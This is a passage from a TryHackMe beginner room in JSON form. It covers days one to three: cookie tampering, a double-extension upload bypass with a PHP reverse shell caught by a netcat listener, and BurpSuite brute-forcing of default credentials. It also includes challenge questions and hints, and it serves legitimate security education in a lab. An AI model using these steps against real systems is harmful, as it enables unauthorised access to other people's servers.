{'image': 'https://tryhackme-images.s3.amazonaws.com/room-icons/61e5fecf25e14912323cf5fd4dd7e934.png', 'title': '25 Days of Cyber Security', 'description': 'Get started with Cyber Security in 25 Days - Learn the basics by doing a new, beginner friendly security challenge every day.', 'code': 'learncyberin25days', 'users': 22214, 'tags': ['beginner', 'christmas', 'challenge', 'advent', 'of', 'cyber', 'two', '2'], 'type': 'walkthrough', 'difficulty': 'easy', 'userCompleted': False, 'upVotes': 807, 'created': '2021-01-07T22:37:42.066Z', 'published': '2020-12-25T17:15:09.016Z', 'freeToUse': True, 'businessOnly': False, 'headerImage': 'https://assets.tryhackme.com/room-banners/adventofcyber.png', 'creator': 'tryhackme', 'tasks': [{'taskTitle': 'Introduction', 'taskDesc': "<p>Hi there - your security journey starts here!</p><p>The aim of this room is to give you a brief introduction to the technical aspects in Cyber Security by completing a single task every day for 25 days(you can do them at your own pace too). Each task is beginner friendly and assumes no prior knowledge about the specific topic. You'll be learning about the following topics:</p><ul><li>Web Application Security</li><li>Network Security</li><li>Scripting</li><li>Open Source Intelligence (OSINT)</li><li>Defensive Security</li></ul><p>After completing this room, you should have an idea about what particular areas of cyber security excite you.</p><p><b>Note: </b>This room is inspired by a Christmas themed event we ran, so do not be alarmed with all the Christmas references!</p>", 'taskType': 'none', 'taskNo': 1, 'taskCreated': '2020-11-10T22:10:28.104Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Read The Above', 'hint': ''}]}, {'taskTitle': 'Get Connected', 'taskDesc': '<div style="text-align:center">\n   <div style="font-size:4em">\n      <i class="fal fa-browser hacker-green">\n         <div style="text-align:center"></div>\n      </i>\n   </div>\n   <div><span style="font-size:18px">On TryHackMe you\'ll learn by deploying and hacking virtual machines<br /><br /></span></div></div><div style="text-align:center">\n   <div style="text-align:left;color:rgb(33, 37, 41)">\n      <div style="text-align:center"><span style="color:rgb(0, 0, 0);font-size:1rem">Lets deploy your AttackBox, a web-based machine used to attack other machines.</span></div>\n      <span style="font-weight:bolder;font-size:18px"><span style="color:rgb(57, 132, 198)"><br /></span></span>\n   </div>\n   <ol>\n      <li style="text-align:left">Click the blue "Start AttackBox" button at the top of this room. As a free user you can only deploy the AttackBox for 1 hour per day -\xa0<a href="https://tryhackme.com/profile#subscribe" target="_blank">Subscribe</a>\xa0to remove this limit.<br /><br /></li><li style="text-align:left">Deploy the machine shown on this task and wait\xa0<u>1 minute</u><span style="text-align:center">\xa0for it to configure.<br /><br /></span></li>\n      <li style="text-align:left">Copy the IP of the machine that you deployed on this task.<br /><img src="https://i.imgur.com/ebs9q3J.png" style="width:647.735px;height:92.0938px" /><br /><br /></li>\n      <li style="text-align:left">Paste the IP into the AttackBox machine\'s Firefox.<br /><img src="https://i.imgur.com/yiuliJf.png" style="width:561px;height:357.259px" /><br /><br /></li></ol></div>\n<div style="text-align:center">\n<details>\n   <summary><span style="font-weight:bolder;font-size:18px"><span style="color:rgb(0, 0, 0)">Alternatively you can access machines via\xa0</span><a target="_blank" href="https://tryhackme.com/access?o=vpn"><span style="color:rgb(231, 148, 57)">OpenVPN</span></a></span></summary>\n   <div style="text-align:center">You can also use an OpenVPN connection and use your own computer. Follow the steps on the <a href="https://tryhackme.com/access?o=vpn" target="_blank">OpenVPN page</a> for further instructions on connecting.\xa0</div>\n</details>\n</div>', 'taskType': 'vm', 'taskNo': 2, 'taskCreated': '2021-01-07T22:46:57.984Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '5e2b5b5e7095e6fb1e9e530f', 'questions': [{'questionNo': 1, 'question': 'Connect to OpenVPN or Deploy The Attack Box', 'hint': ''}]}, {'taskTitle': '[Day 1] <span class="badge badge-soft-danger size-16">Web Exploitation</span> A Christmas Crisis', 'taskDesc': '<p><em>"The Best Festival Company\'s brand new OpenVPN server has been hacked. This is a crisis!</em></p>\n<p><em>The attacker has damaged various aspects of the company infrastructure -- including using the Christmas Control Centre to shut off the assembly line!</em></p>\n<p><em>It\'s only 24 days until Christmas, and that line has to be operational or there won\'t be any presents! You have to hack your way\xa0 back into Santa\'s account (blast that hacker changing the password!) and getting the assembly line up and running again, or Christmas will be ruined!"</em></p>\n<p>*After giving you the assignment, McSkidy hands you the following dossier of important information for the task. Before reading it, you <strong>press the big green "Deploy" button</strong> to start the Control Centre, as well as the <strong>"Start AttackBox" button at the top of the page</strong> *</p>\n<hr />\n<h3><a href="https://www.youtube.com/watch?v=BJF84oWHmok&amp;ab_channel=JohnHammond">Watch JohnHammonds video on solving this task!</a></h3>\n<p><span style="justify:right;float:right">Dossier compiled by <a href="https://twitter.com/MuirlandOracle">@MuirlandOracle</a></span><br />\n<br /></p>\n<h3><em><u>The Web</u>:</em></h3>\n<p>The Internet is one of those things that everyone uses, but few people bother to learn about. As hackers, it is vital that we understand what exactly the web is, and how it works.<br />\n<span style="float:left;padding:20px;width:15%"><img src="https://i.imgur.com/NH7gE5z.png" alt style="width:369.514px;height:170.75px;float:left" class="note-float-left" /></span><br />\n</p><p><br /></p><p><br /></p><p><br /></p><p><br /></p><p><br /></p><p>When you open up your web browser and navigate to a website, it seems so simple, but what is really happening behind the scenes?<br />\nFirst of all, your computer communicates with a known DNS (<strong>D</strong>omain <strong>N</strong>ame <strong>S</strong>ystem) server to find out where the website can be found on the internet. The DNS server will then return an <strong>IP address</strong> for the remote server. This can be used to go directly to the website. You can think of the internet as being quite like the planet itself -- we have lots of locations, all over the world. These places all have a street address -- this is akin to the domain name of a website (i.e. tryhackme.com, or google.com); but they also have co-ordinates which can be used to pinpoint their location with absolute accuracy. These co-ordinates are like the IP address of a website. If you know the street address of a location, you can enter it into Google Maps and be given the exact coordinates, which can then be put into a SatNav to take you there with pinpoint accuracy!<br />\nIn the same way, your browser is given the address of a website (i.e. tryhackme.com). It sends this address off to a DNS server, which tells it the "co-ordinates" (the IP address) of the site. Your computer doesn\'t understand the original, human-readable domain name, but it <em>does</em> understand what an IP address is! The IP can then be used to find the server across the internet, allowing your computer to request the content of the website. Of course, in reality, this is a highly simplified analogy, so a more in-depth explanation of this process can be found <a href="https://tryhackme.com/room/introtonetworking">here</a>.<br />\n<br /></p>\n<h3><i><u>HTTP(S)</u></i>:</h3>\n<p>Once your computer knows where it can find the target website, it sends something called a HTTP (<strong>H</strong>yper<strong>t</strong>ext <strong>T</strong>ransfer <strong>P</strong>rotocol) request to the webserver.<br />\nhttps://i.imgur.com/r2IU7Ka.png<span style="float:right;width:15%;padding:20px"><img src="https://i.imgur.com/r2IU7Ka.png" alt style="width:50%" /></span><br />\nThis is just a standard network request, but it is formatted in a way that both your web browser and the server can understand. In practice, this means adding certain "headers" to the request which identify it as a HTTP request, and tell the server a variety of other information about the request, as well as your own browser. Amongst many other headers, HTTP requests always have a <em>method</em> and a <em>target</em>. These specify <em>what</em> to retrieve from the server (the target), and <em>how</em> to retrieve it (the method). The method most commonly used to <em>retrieve</em> information is called the GET method. When sending data <em>to</em> the server, it\'s more common to use a method called POST.</p>\n<p>For more information about HTTP requests, methods and headers, check out the <a href="https://tryhackme.com/room/webfundamentals">Web Fundamentals</a> room!</p>\n<p>Once the content has been retrieved from the server, your browser reads the retrieved code and renders it as a web page. This usually means taking the layout of the page from a HTML (<strong>H</strong>yper <strong>T</strong>ext <strong>M</strong>arkup <strong>L</strong>anguage) document, styling it with a connected CSS (<strong>C</strong>ascading <strong>S</strong>tyle <strong>S</strong>heets) file, then adding any dynamic content with one or more connected Javascript files.</p>\n<p>HTTP has one inherent disadvantage: namely, it is not secure. Anyone can see what you\'re requesting, and what\'s being sent back to you. For this reason, HTTPS (<strong>H</strong>yper<strong>t</strong>ext <strong>T</strong>ransfer <strong>P</strong>rotocol <strong>S</strong>ecure) was invented. This works in exactly the same way as standard HTTP but provides an encrypted connection (the functionality of which is beyond the level of this dossier)<br />\n<br /></p>\n<h3><i><u>Cookies</u></i>:</h3>\n<p>HTTP is an inherently <em>stateless</em> protocol. This means that no data persists between connections; your computer could make two requests immediately after each other, and, without relying on separate software, the web server would have no way to know that it was you making both the requests. This begs the important question: if HTTP is stateless, then how do login systems work? The web server must have a way to identify that you have the right level of access, and it can hardly ask you to enter your password every time you request a new page!</p>\n<p>The answer is cookies -- tiny little pieces of information that get stored on your computer and get sent to the server along with every request that you make. Authentication (or session) cookies are used to identify you (these will be <em>very</em> important in your mission today!). The server receives your request with the attached cookie, and checks the cookie to see what level of access you are allowed to have. It then returns a response appropriate to that level of access.<br />\n<span style="float:left;width:7%;padding:20px"><img src="https://i.imgur.com/eNMSg5w.png" alt style="width:100%" /></span></p>\n<p>For example, a standard user should be able to see (but not interact with) our control panel; but Santa should be able to access everything! Cookies are also often used for other purposes such as advertising and storing user preferences (light/dark theme, for example); however, this will not be important in your task today. Any site can set cookies with a variety of properties -- the most important of these for today\'s task are the name and value of the cookies, both of which will always be set. It\'s worth noting that a site can only access cookies that are associated with its own domain (i.e. google.com can\'t access any cookies stored by tryhackme.com, and vice versa).</p>\n<p><br /><br />\nIt\'s important to note that cookies are stored locally on <em>your</em> computer. This means that they are under your control -- i.e. you can add, edit, or delete them as you wish. There are a few ways to do this, however, it\'s most commonly done by using your Browser Developer Tools, which can be accessed in most browsers by pressing <code>F12</code>, or <code>Ctrl + Shift + I</code>. With the developer tools open, navigate to the <code>Storage</code> tab in FireFox, or the <code>Application</code> tab in Chrome/Edge and select the <code>Cookies</code> menu on the left hand side of the console.</p>\n<p><img src="https://i.imgur.com/0moCyoO.png" alt /></p>\n<p><br /><br />\nIn the above image you can see a test cookie for a website. The important attributes "Name" and "Value" are shown. The name of a cookie is used to identify it to the server. The value of the cookie is the data stored by the server. In this example the server would be looking for a cookie called "Cookie Name". It would then retrieve the value "CookieValue" from this cookie.</p>\n<p>These values can be edited by double-clicking on them, which is great if you can edit a session or authorisation cookie, as this can lead to an escalation of privileges, assuming you have access to an Administrator\'s authorisation cookie.</p>\n<hr />\n<p><em>Having read the lengthy dossier,\xa0 you get ready to hack your way back into Santa\'s Christmas Control Centre! You <strong>enter the IP address at the top of the screen into your browser search bar</strong> and press enter to load the page.</em></p>\n<p><strong>Note:</strong> Remember that machines can take up to five minutes to boot up fully!</p>\n', 'taskType': 'vm', 'taskNo': 3, 'taskCreated': '2020-11-12T02:45:39.857Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '5fb59df713e2f11575a0e261', 'questions': [{'questionNo': 1, 'question': '<p>Deploy your AttackBox <em>(the blue "Start AttackBox" button</em>) and the tasks machine (<em>green button on this task</em>) if you haven\'t already. Once both have deployed, open FireFox on the AttackBox and copy/paste the machines IP into the browser search bar.</p>\n', 'hint': 'Make sure your are using the IP of the right machine - Its the one found at the top of this page.'}, {'questionNo': 2, 'question': '<p>Register for an account, and then login.</p>\n<p>What is the name of the cookie used for authentication?</p>\n', 'hint': "Check your Browser's Developer tools. These can usually be accessed with F12 in most browsers, or Ctrl + Shift + I otherwise."}, {'questionNo': 3, 'question': '<p>In what format is the value of this cookie encoded?</p>\n', 'hint': 'Often used as a "shorthand for binary".'}, {'questionNo': 4, 'question': '<p>Having decoded the cookie, what format is the data stored in?</p>\n', 'hint': "Use CyberChef to decode the cookie. The format is a very common one, often linked to JavaScript. (https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto'))"}, {'questionNo': 5, 'question': "<p>Figure out how to bypass the authentication.</p>\n<p>What is the value of Santa's cookie?</p>\n", 'hint': 'Remember, you can edit your cookies value! Why not use the decoded cookie you got in the last question, update the username with "santa" and re-encode it? Usernames are often all lower case, so bear this in mind!'}, {'questionNo': 6, 'question': "<p>Now that you are the santa user, you can re-activate the assembly line!</p>\n<p>What is the flag you're given when the line is fully active?</p>\n", 'hint': ''}]}, {'taskTitle': '[Day 2] <span class="badge badge-soft-danger size-16">Web Exploitation</span> The Elf Strikes Back!', 'taskDesc': '<p><em>After your heroic deeds regaining control of the control centre yesterday, Elf McSkidy has decided to give you an important job to do.</em></p>\n<p><em>"We know we\'ve been hacked, so we need a way to protect ourselves! The dev team have set up a website for the elves to upload pictures of any suspicious people hanging around the factory, but we need to make sure it\'s secure before we add it to the public network. Please perform a security audit on the new server and make sure it\'s unhackable!"</em></p>\n<p><em>You listen to the briefing and accept the task, <strong>pressing the deploy button to start the server</strong> as you do so.</em></p>\n<p><em>McSkidy once again gives you a dossier of useful information to help you with your task, which you read as you wait for the server to boot:</em></p>\n<hr />\n<h3><a href="https://www.youtube.com/watch?v=F_nTIX-q32k&amp;">Watch DarkStar\'s video on solving this task!</a></h3>\n<p><span style="float:right;text-align:right">Dossier Compiled by <a href="https://twitter.com/MuirlandOracle">@MuirlandOracle</a></span><br />\n<br /></p>\n<h3><em><u>\ufeffGET Parameters and URLs</u></em></h3>\n<p>We looked briefly at the differences between GET and POST requests in the previous dossier; however, the emphasis was on the POST requests used in a login form. The server you\'ll be testing today employs a concept called "GET parameters". Just as POST requests can be used to send information to the server, so too can GET requests be used; however, there is one important difference. With POST requests the data being sent is included in the "body" of the request. With GET requests, the data is included in the URL as a "parameter". This is best demonstrated with an example:</p>\n<p><code>https://www.thebestfestivalcompany.xyz/index.php?snack=mincePie</code></p>\n<p>(<strong>Please Note</strong>: this site is completely fictitious. It does not exist, and connecting to it is not part of the task)</p>\n<p>There are 7 different parts which make up this URL. Let\'s look at each of them in turn:<br />\n<span style="float:right;width:10%;padding:20px"><img src="https://i.imgur.com/wTKxQot.png" alt style="width:100%" /></span><br />\n<br /></p>\n<ol>\n<li>First up we have the protocol (<code>https://</code>). This specifies whether the request should be made using HTTP, or HTTPS. In our example, we are using HTTPS.</li>\n<li>Next we have the <em>subdomain</em> (<code>www</code>). This is traditionally "www" (<strong>W</strong>orld <strong>W</strong>ide <strong>W</strong>eb) to signify that the target is a website; however, this is not essential. Indeed, subdomains can be basically anything you want; for example, a lot of websites use things like "<code>assets</code>", or "<code>api</code>" to indicate different subdomains with different uses. (e.g. <code>https://api.thebestfestivalcompany.xyz</code>)</li>\n<li>The next part of the URL is the <em>domain</em> (<code>thebestfestivalcompany</code>). Domains need to be registered and are used as links between a memorable word or phrase, and an IP address. In other words, they\'re used to give a <em>name</em> to the server running a website.</li>\n<li>Next up we have the TLD (<strong>T</strong>op <strong>L</strong>evel <strong>D</strong>omain) -- <code>.xyz</code>, for our example. Top-level domains are used by DNS to determine where to look if they want to find your domain. Previously top-level domains had specific uses (and many still do!), but this is not always the case these days. For example, <code>.co.uk</code>\xa0 indicates a company based in the UK, <code>.com</code> indicates a company based in the US.</li>\n<li>We then have the <em>resource</em> that we\'re selecting -- in this case that is the homepage of the website: <code>index.php</code>. As a side note, all homepages <em>must</em> be called "index" in order to be correctly served by the web server without having to be specified fully, unless this parameter has been changed from the default in the webserver configuration. This is how you can go to <code>https://tryhackme.com</code> without having to specify that you want to receive the home page -- the index page is served automatically because you didn\'t specify!</li>\n<li>The final two aspects of the URL are the most important for our current topic: they both relate to GET parameters. First up we have <code>?snack=</code>. Here <code>?</code> is used to specify that a GET parameter is forthcoming. We then have the parameter name: <code>snack</code>. This is used to identify the parameter to the server. We then have an equals sign (<code>=</code>), indicating that the value will come next.</li>\n<li>Finally, we have the value of the GET parameter: <code>mincePie</code>, because who doesn\'t like mince pies, right?</li>\n</ol>\n<p>It\'s important to note exactly which part of the URL is the GET parameter. Specifically, we are talking about <code>?snack=mincePie</code>. If there was more than one parameter, we would separate them with an ampersand (<code>&amp;</code>). For example: <code>?snack=mincePie&amp;drink=hotChocolate</code>. In this way we can send multiple values to the server, distinguished by keys (i.e. "mincePie" is identified by the key: "snack").<br />\n<br /></p>\n<h3><em><u>File Uploads</u></em></h3>\n<p>There are countless uses for file uploads in the modern internet -- profile pictures, school/university submissions, diagrams, pictures of your dog, you name it! Whilst file uploads are very common, they\'re also very easy to implement in an insecure fashion. For this reason, it\'s important that we understand the gravity of the attack vector.<br />\n<span style="float:left;width:8%;padding:20px"><img src="https://i.imgur.com/JaHL3Lr.png" alt style="width:100%" /></span><br />\nWhen you have the ability to upload files to a server, you have a path straight to RCE (<strong>R</strong>emote <strong>C</strong>ommand <strong>E</strong>xecution). An upload form with no restrictions would mean that you could upload a script that, when executed, connects back to your attacking machine and gives you the ability to run any command you want. It would be very unusual to find a file upload with <em>no</em> filtering; but it\'s much less uncommon to find a file upload that employs flawed filtering techniques which can be circumvented to upload a malicious script. The script has to be written in a language which the server can execute. PHP is usually a good choice for this, as most websites are still written with a PHP back end.</p>\n<p>There isn\'t time to go over every kind of filter bypass in this task (there is literally an <a href="https://tryhackme.com/room/uploadvulns">entire room on this topic</a>, which is recommended for further practice). Instead, we\'ll just cover one of the most common types of filter and its bypass:</p>\n<ul>\n<li><em>File Extension Filtering:</em> As the name suggests extension filtering checks the file extension of uploaded files. This is often done by specifying a list of allowed extensions, then checking the uploaded file against the list. If the extension is not in the allowlist, the upload is rejected.</li>\n<li>So, what\'s the bypass? Well, the answer is that it depends entirely on how the filter is implemented. Many extension filters split a filename at the dot (<code>.</code>) and check what comes after it against the list. This makes it very easy to bypass by uploading a double-barrelled extension (e.g. <code>.jpg.php</code>). The filter splits at the dot(s), then checks what it thinks is the extension against the list. If jpg is an allowed extension then the upload will succeed and our malicious PHP script will be uploaded to the server.</li>\n</ul>\n<p>When implementing an upload system, it\'s good practice to upload the files to a directory that can\'t be accessed remotely. Unfortunately, this is often not the case, and scripts are uploaded to a subdirectory on the webserver (often something like <code>/uploads</code>, <code>/images</code>, <code>/media</code>, or <code>/resources</code>). For example, we might be able to find the uploaded script at <code>https://www.thebestfestivalcompany.xyz/images/shell.jpg.php</code>.<br />\n<br /></p>\n<h3><em><u>Reverse Shells</u></em></h3>\n<p>Let\'s assume that we\'ve found somewhere to upload our malicious script, and we\'ve bypassed the filter -- what then? There are a few paths we can take: the most common of which is uploading a <em>reverse shell</em>. This is a script that creates a network connection <em>from</em> the server, <em>to</em> our attacking machine. The majority of webservers are written with a PHP back end, which means we need a PHP reverse shell script -- there happens to be one already on Kali/AttackBox at\xa0<code>/usr/share/webshells/php/php-reverse-shell.php</code> (Note: if you\'re not using Kali or the provided AttackBox, the same script can be found <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">here</a>.</p>\n<ul>\n<li>Copy the webshell out into your current directory (<code>cp /usr/share/webshells/php/php-reverse-shell.php .</code>), then open it with your text editor of choice.</li>\n<li>Scroll down to where it has <code>$ip</code> and <code>$port</code> (both marked with <code>// CHANGE THIS</code>). Set the IP to your TryHackMe IP Address (which can be found in the green bubble on the navbar, if you\'re using the AttackBox, or by running <code>ip a show tun0</code> if you\'re using your own Linux VM with the OpenVPN connection pack) -- making sure to keep the double-quotes. Set the port to <code>443</code>\xa0with no double quotes, then save and exit the file. Congratulations, you now have a fully configured PHP reverse shell script!</li>\n</ul>\n<p><br /><br />\n<img src="https://assets.tryhackme.com/additional/cmn-aoc2020/phpshell.png" alt /><br />\n<img src="https://i.imgur.com/aU9tdIH.png" alt /><span class="size" style="font-size:18px"><span class="size" style="font-size:16px"></span></span></p>\n<p>PHP reverse shells can be very easily activated when stored in an accessible location: simply navigate to the file in your browser to execute the script (and send the reverse shell):</p>\n<p><img src="https://i.imgur.com/e0lOjZ5.png" alt /></p>\n<p>In the diagram, we first upload our shell. We then navigate to it in our browser, causing the server to send a reverse shell back to our waiting listener.<br />\nFor a more in-depth explanation of reverse shells, check out the <a href="https://tryhackme.com/room/introtoshells">Intro to Shells</a> room.<br />\n<br /></p>\n<h3><em><u>Reverse Shell Listeners</u></em></h3>\n<p><span style="float:right;width:8%;padding:20px"><img src="https://i.imgur.com/GjjcCrr.png" alt style="width:100%" /></span><br />\nWe\'ve spoken at length about reverse shell listeners, but what are they? In short, a reverse shell listener is used to open a network socket to receive a raw connection -- like the one created by a reverse shell being executed! The simplest form of listener is created by using a program called <em>netcat</em>, which is installed on both Kali and the AttackBox by default. We can create a listener for an uploaded reverse shell by using this command: <code>sudo nc -lvnp 443</code>. This essentially creates a listener on port 443. In a real-world environment, you would want to use a common port such as 443 that is not filtered by firewalls in most scenarios, increasing the chances our reverse shell connects back.. Once <em>netcat</em> has been setup, our reverse shell will be able to connect back to this when activated.</p>\n<p>The full explanation can be found in the Intro to Shells room linked above, if you\'re interested.<br />\n<br /></p>\n<h3><em><u>Putting it all together</u></em></h3>\n<p>This was a <em>lot</em> of information, so let\'s put it all together and look at the full process for exploiting a file upload vulnerability in a PHP web application:</p>\n<ol>\n<li>Find a file upload point.</li>\n<li>Try uploading some innocent files -- what does it accept? (Images, text files, PDFs, etc)</li>\n<li>Find the directory containing your uploads.</li>\n<li>Try to bypass any filters and upload a reverse shell.</li>\n<li>Start a netcat listener to receive the shell</li>\n<li>Navigate to the shell in your browser and receive a connection!</li>\n</ol>\n<hr />\n<p><em>At the bottom of the dossier is a sticky note containing the following message:</em></p>\n<blockquote>\n<p>For Elf McEager:<br />\nYou have been assigned an ID number for your audit of the system: <b><code>ODIzODI5MTNiYmYw</code></b> . Use this to gain access to the upload section of the site.<br />\nGood luck!</p>\n</blockquote>\n<p><em>You note down the ID number and <strong>navigate to the displayed IP address (MACHINE_IP) in your browser</strong>.</em></p>\n', 'taskType': 'vm', 'taskNo': 4, 'taskCreated': '2020-11-12T02:45:54.983Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '5fb819f06774e53880f4ae33', 'questions': [{'questionNo': 1, 'question': '<p>What string of text needs adding to the URL to get access to the upload page?</p>\n', 'hint': 'Look at the homepage of the website and combine what you find there with the ID given in the task (ODIzODI5MTNiYmYw). The answer starts with ?id=..'}, {'questionNo': 2, 'question': '<p>What type of file is accepted by the site?</p>\n', 'hint': 'There are three filetypes accepted by the upload form. These can be found by checking the page source code. They all have something in common in that they are types of ____ file.'}, {'questionNo': 3, 'question': '<p>Bypass the filter and upload a reverse shell.</p>\n<p>In which directory are the uploaded files stored?</p>\n', 'hint': 'The filter can be bypassed using the technique taught in the task.\n\nThe answer can be found with a tool such as Gobuster, or by checking each of the common directories from the dossier.'}, {'questionNo': 4, 'question': '<p>Activate your reverse shell and catch it in a netcat listener!</p>\n', 'hint': 'As a reminder, the syntax for setting up a reverse shell listener is: sudo nc -lvnp 443. Make sure that the shell you uploaded has the correct IP address and port in it!'}, {'questionNo': 5, 'question': '<p>What is the flag in <code>/var/www/flag.txt</code>?</p>\n', 'hint': 'cat /var/www/flag.txt'}]}, {'taskTitle': '[Day 3] <span class="badge badge-soft-danger size-16">Web Exploitation</span> Christmas Chaos', 'taskDesc': '<p><span style="float:left;padding:20px;width:100px"><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-3/sleigh.svg" alt style="width:100%" /></span><em>McSkidy is walking down the corridor and hears a faint bleeping noise, Beep.... Beep.... Beep... as McSkidy gets closer to Sleigh Engineering Room the faint noise gets louder and louder.. BEEP.... BEEP.... Something is clearly wrong! McSkidy runs to the room, slamming open the door to see Santa\'s sleighs control panel lite up in red error messages! "Santa sleigh! It\'s been hacked, code red.. code red!" he screams as he runs back to the elf security command center.</em></p>\n<p><em>Can you help McSkidy and his team hack into Santa\'s Sleigh to re-gain control?</em></p>\n<hr />\n<h3><a href="https://www.youtube.com/watch?v=cQq6xPCZFjg&amp;">Watch DarkStar\'s video on solving this task!</a></h3>\n<h4>Learning Objectives</h4>\n<ul>\n<li>Understanding Authentication</li>\n<li>Understand the use of default credentials and why they\'re dangerous</li>\n<li>Bypass a login form using BurpSuite</li>\n</ul>\n<h4>Authentication</h4>\n<p>Authentication is a process of verifying a users\' identity, normally by credentials (such as a username, user id or password); to put simply, authentication involves checking that somebody really is who they claim to be. Authorization (which is fundamentally different to authentication, but often used interchangeably) determines what a user can and can\'t access; authorization is covered in tomorrow walkthrough, today\'s task focuses on authentication and some common flaws.<br />\n<br /></p>\n<h4>Default Credentials</h4>\n<p>You\'ve probably purchased (or downloaded a service/program) that provides you with a set of credentials at the start and requires you to change the password after it\'s\xa0set up (usually these credentials that are provided at the start are the same for every device/every copy of the software). The trouble with this is that if it\'s not changed, an attacker can look up (or even guess) the credentials.</p>\n<p>What\'s even worse is that these devices are often exposed to the internet, potentially allowing anyone to access and control it. In 2018 it was reported that a botnet (a number of internet-connected devices controlled by an attacker to typically perform DDoS attacks) called <a href="https://www.cloudflare.com/learning/ddos/glossary/mirai-botnet/">Mirai</a> took advantage of <strong>I</strong>nternet <strong>o</strong>f <strong>T</strong>hings (<strong>IoT</strong>) devices by remotely logging, configuring the device to perform malicious attacks at the control of the attackers; the Mirai botnet infected over 600,000 IoT devices mostly by scanning the internet and using default credentials to gain access.</p>\n<p>In fact, companies such as Starbucks and the US Department of Defense have been victim to leaving services running with default credentials, and bug hunters have been rewarded for reporting these very simple issues responsibly (Starbucks paid $250 for the reported issue):</p>\n<ul>\n<li><a href="https://hackerone.com/reports/195163">https://hackerone.com/reports/195163</a> - Starbucks, bug bounty for default credentials.</li>\n<li><a href="https://hackerone.com/reports/804548">https://hackerone.com/reports/804548</a> - US Dept Of Defense, admin access via default credentials.</li>\n</ul>\n<p>In 2017, it was <a href="https://www.bleepingcomputer.com/news/security/15-percent-of-all-iot-device-owners-dont-change-default-passwords/">reported</a>\xa0that 15% of all IoT devices still use default passwords.</p>\n<p><a href="https://github.com/danielmiessler/SecLists/">SecLists</a> is a collection of common lists including usernames, passwords, URLs and much more. A password list known as "rockyou.txt" is commonly used in security challenges, and should definitely be a part of your security toolkit.<br />\n<br /></p>\n<h4>Dictionary Attacks using BurpSuite</h4>\n<p>A dictionary attack is a method of breaking into an authenticated system by iterating through a list of credentials. If you have a list of default (or the most common) usernames and passwords, you can loop through each of them in hopes that one of the combinations is successful.</p>\n<p>You can use a number of tools to perform a dictionary attack, one notable one being Hydra (a fast network logon cracker) and BurpSuite, an industry-standard tool used for web application penetration testing. Given day 3 is about web exploitation, we\'ll show you how to use BurpSuite to perform a dictionary attack on a web login form.</p>\n<p>To download BurpSuite click <a href="https://portswigger.net/burp/communitydownload">here</a>, otherwise, BurpSuite is pre-installed on our web-based AttackBox.<br />\n<br /></p>\n<ol>\n<li>Start BurpSuite, you can do this on the AttackBox by clicking BurpSuite logo in the icon tray.<br />\n<img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-3/burplogo.png" alt="BurpSuite logo" /></li>\n<li>Once this has loaded, you want to "Intercept" your traffic by proxying it through the BurpSuite, which will then forward the request to the intended destination (in our case it will be a website) This will give you the ability to analyse and modify your browsers traffic.\n<ol>\n<li>This example uses the AttackBox, and makes proxying traffic to BurpSuite easy (if you\'re using BurpSuite on your own machine, click <a href="https://portswigger.net/burp/documentation/desktop/getting-started/proxy-setup/browser">here</a>) to see how to proxy traffic to BurpSuite). On the AttackBox, open Firefox, click on the FoxyProxy browser extension, and select "Burp" - this will now proxy your traffic to BurpSuite.<br />\n<img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-3/burpproxy.png" alt="FoxyProxy" /></li>\n<li>Go to the BurpSuite application and click the Proxy tab, then click the button "Intercept is on".</li>\n</ol>\n</li>\n<li>Navigate to your chosen website, as you\'re intercepting your traffic, you will see BurpSuite has held your request and will not forward it on until you tell it to. Let\'s go to our web application and submit your details into a given form, in our case its a generic login form.</li>\n<li>This captured request will show up in the Proxy tab. Right-click it, and click "Send to Intruder"; BurpSuite has a lot of functionality to repeat modify and manipulate requests, Burp Intruder is a tool to automate customize web attacks. We will use intruder to loop through and submit a login request using a list of default credential, in the hopes that one of the usernames and passwords in the list is correct.<br />\n<img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-3/sendtointruder.png" alt="Burp Intruder link" /></li>\n<li>Go to the Intruder tab, you should see your request. Here we will insert "positions" (telling Burp which fields to update when automating a request), select a list per position and start the attack.\n<ol>\n<li>Click the <strong>"Positions"</strong> tab, and clear the pre-selected positions.</li>\n<li>Add the username and password values as positions (highlight the text and click "Add")</li>\n<li><strong>Select "Cluster Bomb" in the Attack type dropdown menu</strong>; this attack type iterates through each payloads sets in turn, so every combination of each set is tested.<br />\n<img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-3/addpositions.png" alt="Burp Positions" /></li>\n</ol>\n</li>\n<li>We\'re going to tell each "Position" which Payload to use. In our example, we will select a list of usernames for the username field and a list of passwords for the password field.\n<ol>\n<li>Click the "Payloads" tab, select your Payload set (set 1 is the username field, set 2 is the password field) and add select your list in the "Payload Options" section (or manually add entries).</li>\n<li>For set 1 (username), we will add a few common default username entries such as "admin", "root" and "user"<br />\n<img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-3/lists.png" alt="Burp Position Lists" /></li>\n<li>For set 2 (password), we will add a few common default passwords such as "password", "admin" and "12345"<br />\n<img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-3/set2.png" alt="Burp Set 2 payload" /></li>\n</ol>\n</li>\n<li>Click the "Start Attack" button, this will loop through each position list in every combination. You can sort by the "Length" or "Status" to identify a successful login (<em>typically all incorrect logins will have the same status or length, if a combination is correct it will be different</em>.</li>\n</ol>\n<p><br /><br />\n<em><strong>Use what you\'ve learnt to help McSkidy hack back into the Santa Sleigh Tracker!</strong></em></p>\n', 'taskType': 'vm', 'taskNo': 5, 'taskCreated': '2020-11-12T02:46:04.005Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '5fc6c88504c12aa15ea04f31', 'questions': [{'questionNo': 1, 'question': '<p>Deploy your AttackBox (the blue "Start AttackBox" button) and the tasks machine (green button on this task) if you haven\'t already. Once both have deployed, open Firefox on the AttackBox and copy/paste the machines IP (MACHINE_IP) into the browser search bar.</p>\n', 'hint': ''}, {'questionNo': 2, 'question': "<p>Use BurpSuite to brute force the login form.\xa0 Use the following lists for the default 